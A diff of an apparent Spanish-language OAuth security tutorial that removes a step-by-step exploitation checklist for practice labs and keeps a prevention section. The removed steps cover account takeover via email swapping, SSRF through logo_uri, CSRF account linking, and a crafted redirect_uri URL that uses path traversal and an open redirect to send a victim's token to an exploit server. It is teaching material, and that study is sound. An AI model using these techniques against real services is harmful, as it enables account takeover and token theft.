@@ -548,34 +548,6 @@ También podríamos `aprovechar` esta `función` para `eludir` la `validación` 
 
 Para `verificar` si esta `opción` es `compatible`, debemos `buscar la configuración request_uri_parameter_supported en el archivo de configuración o en la documentación`. Alternativamente, podemos probar a `agregar el parámetro request_uri para ver si funciona`. Esto lo hacemos debido a que `hay algunos servidores que admiten esta función incluso si no la mencionan explícitamente en su documentación`
 
-## Cheatsheet
-
-Usaremos esta `cheatsheet` para facilitar la `detección` y `explotación` de esta `vulnerabilidad`:
-
-- Hacking tools [https://justice-reaper.github.io/posts/Hacking-Tools/](https://justice-reaper.github.io/posts/Hacking-Tools/)
-
-## ¿Cómo detectar y explotar vulnerabilidades de OAuth?
-
-1 - `Instalar` la extensión `OAUTH Scan` de `Burpsuite`
-
-2 - `Interactuar con todas las funcionalidades de OAuth del sitio web`
-
-3 - Agregar al `scope` el `dominio` y `subdominios` de `OAuth` y del `dominio normal`
-
-4 - `Analizar las peticiones que se han producido`
-
-5 - Ahora lo que vamos a hacer es `cerrar sesión` e `iniciar sesión usando OAuth` y `volver a analizar las peticiones que se han producido ahora`. `Una vez hecho estos 2 análisis, ya podemos usar estas peticiones para probar los ataques que se plantean a continuación`
-
-6 - Si al `iniciar sesión` vemos que se `envía` un `email`, cambiaremos ese `email` por el de `otro usuario` para ver si podemos `iniciar sesión` en su `cuenta`. `Si tenemos dudas con este procedimiento es recomendable leerse este post` [https://justice-reaper.github.io/posts/OAuth-Vulnerabilities-Lab-1/](https://justice-reaper.github.io/posts/OAuth-Vulnerabilities-Lab-1/)
-
-7 - `Mientras` nos `logueamos` nos `dirigimos` al `logger` y vemos a ver si se está cargando algún `logo` en el `dominio de autenticación de OAuth`. Si es así nos `enviamos` esa `petición` al `Repeater` y `comprobamos` si `existe` este archivo `/.well-known/oauth-authorization-server` u este otro `/.well-known/openid-configuration` en el `dominio de autenticación de OAuth`. Si existen, intentaremos `crear una aplicación cliente con el parámetro logo_uri apuntando a una página interna de la máquina víctima, para conseguir así las credenciales de otro usuario`. `Si tenemos dudas con este procedimiento es recomendable leerse este post` [https://justice-reaper.github.io/posts/OAuth-Vulnerabilities-Lab-2/](https://justice-reaper.github.io/posts/OAuth-Vulnerabilities-Lab-2/)
-
-8 - Si tenemos la opción de `linkear` nuestra `cuenta normal` con nuestra `cuenta de redes sociales`, `iniciaremos sesión` con la `cuenta normal` y la `linkearemos` con nuestra `cuenta de redes sociales`. Después intentaremos `linkear nuestra cuenta normal con la de redes sociales nuevamente pero esta vez, capturaremos el flujo de peticiones y cuando lleguemos petición en la que se envía el código de verificación https://0abf000b04d62b1d81eb2062009100d1.web-security-academy.net/oauth-linking?code=bHAvk0wtclb6jTsPVrCczl_QARMaJ6tev-NO9sqGu_s la dropearemos`. Nos `iremos` al `Exploit Server` y `crearemos` un `payload` con este `enlace` para que `cuando el usuario víctima acceda, vincule su cuenta a nuestra cuenta de redes sociales`. `Si tenemos dudas con este procedimiento es recomendable leerse este post` [https://justice-reaper.github.io/posts/OAuth-Vulnerabilities-Lab-3/](https://justice-reaper.github.io/posts/OAuth-Vulnerabilities-Lab-3/)
-
-9 - Nos `logueamos` normalmente, nos `deslogueamos` y volvemos a `loguearnos`. En este último `inicio de sesión` veremos que se `tramita` una `petición` de este estilo `https://oauth-0a2b006b0469ac418024c403028300be.oauth-server.net/auth?client_id=a6i3uxn36dmkju1zrg48d&redirect_uri=https://0a87005e046eac448059c68000c6005b.web-security-academy.net/oauth-callback&response_type=code&scope=openid%20profile%20email`. `Enviamos` esta `petición` al `Repeater` y si vemos que podemos `manipular` el `parámetro redirect_uri`, vamos a `crear un payload para que el parámetro redirect_uri apunte a nuestro Exploit Server y así robarle a la víctima su código de autorización de OAuth e iniciar sesión en su cuenta`. `Si tenemos dudas con este procedimiento es recomendable leerse este post` [https://justice-reaper.github.io/posts/OAuth-Vulnerabilities-Lab-4/](https://justice-reaper.github.io/posts/OAuth-Vulnerabilities-Lab-4/)
-
-10 - En caso de que `lo anterior no sea posible porque el parámetro redirect_uri no nos acepta cualquier URL`, vamos a intentar hacer un `path traversal simple ../` y esto lo vamos a combinar con un `open redirect`, tal que así `https://0adc001204d776348092711d002b00da.web-security-academy.net/post/next?path=https://google.es`. El resultado final sería este `https://oauth-0ae9004f04e1c6638185ddac0230000f.oauth-server.net/auth?client_id=q2q7kc9umvpf7hxambobn&redirect_uri=https://0a8400660405c6888116dfdf00be0038.web-security-academy.net/oauth-callback/../post/next?path=https://exploit-0a35002e0433c6b6813cde6b01a300cb.exploit-server.net/exploit&response_type=token&nonce=-1397029964&scope=openid%20profile%20email`, lo que hacemos es aprovechar el `path traversal` para `acceder` a la `página` en la que se encuentra el `open redirect` y usar el `open redirect` para `hacer una petición` a nuestro `Exploit Server` para `robarle` al `usuario víctima` su `token de autenticación` y así `poder ver información de su cuenta haciendo una petición a una ruta del dominio de autenticación de OAuth`. Esta ruta podría ser `/me` u otra en la que se muestre `información del usuario`. `Si tenemos dudas con este procedimiento es recomendable leerse este post` [https://justice-reaper.github.io/posts/OAuth-Vulnerabilities-Lab-5/](https://justice-reaper.github.io/posts/OAuth-Vulnerabilities-Lab-5/)
-
 ## ¿Cómo prevenir vulnerabilidades de autenticación OAuth?
 
 Para `prevenir` que surjan `vulnerabilidades de autenticación OAuth`, es esencial que `tanto el proveedor OAuth como la aplicación cliente implementen una validación sólida de las entradas clave, especialmente del parámetro redirect_uri`. `La especificación OAuth incluye muy pocas protecciones incorporadas`, por lo que `depende` de los `desarrolladores` hacer `el flujo OAuth lo más seguro posible`
